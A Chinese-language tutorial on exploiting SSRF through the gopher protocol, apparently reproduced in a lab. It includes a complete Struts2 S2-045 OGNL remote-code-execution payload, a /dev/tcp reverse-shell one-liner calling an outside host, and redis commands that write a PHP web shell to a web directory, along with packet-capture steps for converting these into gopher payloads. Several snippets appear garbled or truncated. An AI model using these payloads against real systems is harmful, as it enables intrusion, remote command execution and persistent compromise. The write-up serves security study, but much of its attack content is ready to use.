## gopher 协议
#### 协议简介
gopher 协议是一个在http 协议诞生前用来访问Internet 资源的协议可以理解为http
协议的前身或简化版，虽然很古老但现在很多库还支持gopher 协议而且gopher 协议功能很强大。  
它可以实现多个数据包整合发送，然后gopher 服务器将多个数据包捆绑着发送到客户端，这就是它的菜单响应。比如使用一条gopher 协议的curl
命令就能操作mysql 数据库或完成对redis 的攻击等等。  
gopher 协议使用tcp 可靠连接。
#### 协议格式
gopher url 格式为：  
`gopher://:/`  
``默认为70。  
``其中格式可以是如下其中的一种
    %09
    %09%09
整个``部分可以省略，这时候`\`也可以省略``为默认的1。  
``是一个单字符用来表示url 资源的类型，在常用的安全测试中发现不管这个字符是什么都不影响，只要有就行了。  
``个人理解这个是包的内容，为了避免一些特殊符号需要进行url 编码，但如果直接把wireshark 中ascii
编码的数据直接进行url 编码然后丢到gopher 协议里跑会出错，得在wireshark 里先换成hex
编码的原始数据后再每两个字符的加上`%`，通过对比发现直接url 编码的话会少了`%0d`回车字符。  
``用于向gopher 搜索引擎提交搜索数据，和``之间用`%09`隔开。  
``是获取gopher+ 项所需的信息，gopher+ 是gopher 协议的升级版。
## gopher 协议在ssrf 中的利用
出现ssrf 的地方如果没有对协议、ip、端口等一些东西进行限制，则可以用来探测内网存活的ip 及开放的端口、读取任意文件、利用phar
协议触发反序列化、攻击内网redis/memcache/mysql 及web 应用fastcgi 或其他服务等等。  
而gopher 协议在其中占了很重要的角色。
#### 测试代码
java 中的ssrf 漏洞的限制比php 多得的，而且gopher 协议在jdk8 中就被移除了，所以这次测试都是使用如下的php 代码。
#### 攻击内网web 服务
当通过ssrf 发现内网存在着一些比较脆弱的web 服务，比如有存在struts 2漏洞的web 服务，就可以尝试使用gopher 协议把poc
发送过去实现rce，比如下面复现的这个内网struts 2 s2-045漏洞就是通过gopher 协议提交位于header 内的poc 来完成rce。  
实验中存在ssrf 漏洞的靶机是192.168.73.150，存在struts 2 s2-045
漏洞的内网靶机是192.168.123.155（假装它们在同一内网）。  
通常的s2-045 的poc 如下
    GET /showcase.action HTTP/1.1
    Host: 192.168.123.155:8080
    Content-Type:%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
对该poc 的空格和一些特殊字符进行url 编码，然后每个回车都编码成`%0d%0a`包括尾巴行的回车即可用gopher 协议提交。  
我为了方便直接把`Content-Type`后面的poc 全部url 编码了，最后结果如下，需要注意的事在url 中提交ssrf
poc的时候得再进行一次url 编码。  
这里也可以直接反弹shell，s2-045 使用这条命令可以反弹shell  
`exec 5<>/dev/tcp/192.168.123.182/7777;cat &5
>&5;done`
#### 攻击内网redis
这里攻击的redis 是存在密码的，ssrf 漏洞机器和redis 为同一台，网上很多文章都是使用脚本来完成攻击payload
的生成，个人测试发现并不需要那么麻烦。  
写web shell  
这个的利用条件是知道web 目录，redis 启动账户有权限往web 目录里写入内容。  
普通利用redis 写web shell 过程，是设置了一个key 的值为shell 后通过备份数据库把shell 保存到web 目录，操作如下。
    [root@localhost ~]# redis-cli -h 192.168.73.150 -a foo
    Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
    192.168.73.150:6379> set shell ''
    OK
    192.168.73.150:6379> config set dir '/usr/local/apache2.4/htdocs'
    OK
    192.168.73.150:6379> config set dbfilename shell.php
    OK
    192.168.73.150:6379> save
    OK
    192.168.73.150:6379>
利用gopher 协议则需要现在先在本地利用上述操作复现并抓包下来后，丢到wireshark 里导出原始数据处理成gopher 协议的poc，具体如下。  
使用tcpdum 抓包回环网卡lo 的6379 端口的完整包内容写入到a.cap
    tcpdump -i lo port 6379 -s 0 -w a.cap
将a.cap 用wireshark 打开找到发送redis 命令的包然后追踪流，以原始数据报错到a.txt
使用如下命令将原始数据a.txt 的内容进行编码，后使用gopher 协议发送到6379 端口